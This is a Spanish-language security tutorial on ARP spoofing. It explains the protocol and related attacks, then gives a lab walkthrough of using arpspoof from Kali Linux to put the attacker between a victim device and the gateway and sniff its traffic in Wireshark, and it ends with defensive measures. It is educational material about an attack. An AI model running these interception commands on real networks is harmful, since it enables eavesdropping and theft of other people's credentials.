<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?color=F70000&width=430&lines=Ataque+de+ARP+Spoofing/Poison"></a>
</p>

<h1 align="center"></h1>

La suplantación de ARP (ARP Spoofing) o envenenamiento ARP (ARP Poison) es un tipo de ataque en el que un autor malicioso envía mensajes ARP (Protocolo de Resolución de Direcciones) falsificados a través de una red local, lo que da como resultado la vinculación de la dirección MAC del atacante con la dirección MAC del dispositivo o servidor legítimo en la red. De este modo, el atacante comenzará a recibir los datos destinados de esa dirección IP, permitiendo así que que partes malintencionadas intercepten, modifiquen o incluso detengan datos en tránsito. 

Los ataques de suplantación de identidad ARP solo pueden ocurrir en redes de área local que utilizan el Protocolo de resolución de direcciones. Se trata de un protocolo muy importante en la red ya que tiene como objetivo vincular la dirección MAC correspondiente con la IP asignada. Para conseguir esto se envía un paquete (solicitud ARP) a todos los dispositivos en la LAN Ethernet. ARP convierte dinámicamente las direcciones de Internet en las direcciones de hardware con una dirección IP, cada dispositivo recibe una máscara de subred, dirección IP y MAC para poder navegar en internet y enviar datos a través TCP/IP.

Dicho lo anterior, ARP es un protocolo sumamente importante pero que en ocasiones presenta vulnerabilidades. Es por ello que puede haber suplantación ARP, este ataque suele ocurrir en áreas de redes locales y tiene graves consecuencias tanto para simples usuarios como a nivel empresarial. Los ataques de suplantación ARP se utilizan para robar información confidencial, pero más allá de ésto, a menudo se ejecutan para facilitar otros vectores de ataque como:

- **Ataques de denegación de servicio**: Los ataques DoS se aprovechan de la suplantación de ARP para vincular varias direcciones IP con la dirección MAC de un solo objetivo. De tal manera que el tráfico destinado a muchas direcciones IP diferentes se redirigirá a la dirección MAC del objetivo, sobrecargando el objetivo con tráfico.

- **Secuestro de sesión**: Los ataques de secuestro de sesión pueden usar la suplantación de identidad ARP para robar ID de sesión, otorgando a los atacantes acceso a sistemas y datos privados.

- **Ataques de hombre en medio (MITM)**: Los ataques MITM pueden basarse en la suplantación de identidad ARP para interceptar y modificar el tráfico entre las víctimas, permitiendo ver y capturar las credenciales de sitios webs que visita el usuario.



<p align="center">
  <img src="https://github.com/R3LI4NT/articulos/blob/main/Redes/GNU-Linux/img/ARP_Spoofing.png">
</p>

<h1 align="center"></h1>

### Ataque ARP Spoofing a Windows 10 | Manual

El siguiente ejercicio práctico que se vera a continuación es cómo realizar un ataque ARP Spoofing a un sistema Windows desde nuestro laboratorio hacking (Kali Linux), cambiando la dirección MAC de la víctima y poder leer o enviar paquetes hacia su equipo pasando antes por nuestro atacante.

Desde nuestra máquina atacante debemos tener instalada la herramienta **ArpSpoof** de la suite Dsniff.

**_Instalar en Debian:_**
```
sudo apt-get install dsniff
```

El primer paso es conocer la dirección IP de nuestro Gateway. Para esto, ejecutar el siguiente comando:
```
route -n
```

![1](https://user-images.githubusercontent.com/75953873/229241674-7c33df54-fd21-4414-b339-c3bef833dc17.png)


Seguidamente debemos reconocer la dirección IP privada de nuestra víctima (en mi caso un dispositivo Android). Para ello, podemos hacer uso de varias herramientas que viene instaladas por defecto, por ejemplo, Netdiscover.

```
netdiscover -i wlan0 -r 192.168.1/24
```
![2](https://user-images.githubusercontent.com/75953873/230746245-726156f1-a7ca-4f24-b6a6-cd371f0ff29b.png)


Lo que haremos a continuación es interceptar el tráfico del dispositivo Android (192.168.1.4), de modo que, el tráfico pase por nosotros y éste pase al Gateway (192.168.1.1) y viceversa. Ejecutamos el siguiente comando:

```
arpspoof -i wlan0 -t 192.168.1.4 192.168.1.1
```

- **-i**: Especificar la interfaz de red.

- **-t**: IP privada de la víctima (tráfico a interceptar).

![3](https://user-images.githubusercontent.com/75953873/230746316-bcd82f1f-e22c-4e27-a7e9-c692a60a1fa3.png)

En la imagen anterior se observa como el tráfico del dispositivo Android fue interceptado para que primero pase por mi máquina atacante y luego redireccionado al Gateway. Ahora, abrimos otra terminal (sin cerrar la primera) y ejecutamos el mismo comando pero viceversa, es decir, capturar el tráfico del Gateway (respuesta) que va dirigido a la víctima.

```
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.4
```

![4](https://user-images.githubusercontent.com/75953873/230746390-aefc5695-aa14-4c9e-b998-633d01b52974.png)

Con lo anterior realizado ya estaría ejecutandose el ataque ARP Spoofing, y lo que podemos hacer luego es abrir Wireshark y sniffear el tráfico proveniente de la IP víctima (192.168.1.4) mediante filtros. Por ejemplo, el filtro `ip.addr == 192.168.1.4`, `arp`, `http`, etc.

![6](https://user-images.githubusercontent.com/75953873/230746710-f365c6c6-86f1-4cd8-adfe-f2dd3bc5cac2.png)

<h1 align="center"></h1>

</br>

### EVITAR ATAQUES ARP SPOOFING

Estos ataques son muy peligrosos, más aún para empresas ya que manejan información confidencial que viajan en la red y que los atacantes pueden interceptar. Todo esto se puede evitar implementando medidas de seguridad como firewalls, autenticación, sistema de detección de intrusos, sistema de cifrado, entre otras recomendadas. Existen herramientas gratuitas que permiten monitorear el tráfico LAN (Ethernet) como lo es ArpWatch o/y ArpAlert, esto nos permite controlar que dispositivos hay conectados y su actividad en la red.

Para reducir el impacto del ataque lo que se suele hacer es subdividir la red en varias partes el número de host. Esto evita que, en caso de que haya un ataque en un empresa por parte de un usuario malintencionado, solo afecte a una cierta parte y no a toda la red global. Lo útilmo y más importante, proteger las redes adecuadamente con contraseñas complejas y agregar filtrado de listas si es preciso, los ataques intermediarios necesita una brecha de seguridad y que mejor que el error humano.


</br>

<h1 align="center"></h1>

<h3 align="center"><ins>ADVERTENCIA<ins></h3>

<h4 align="center">Esto es con fines de aprendizaje, no nos hacemos responsables ni el fundador, ni el creador del tema del mal uso de esta herramienta u información.</h4>



#### ~R3LI4NT~
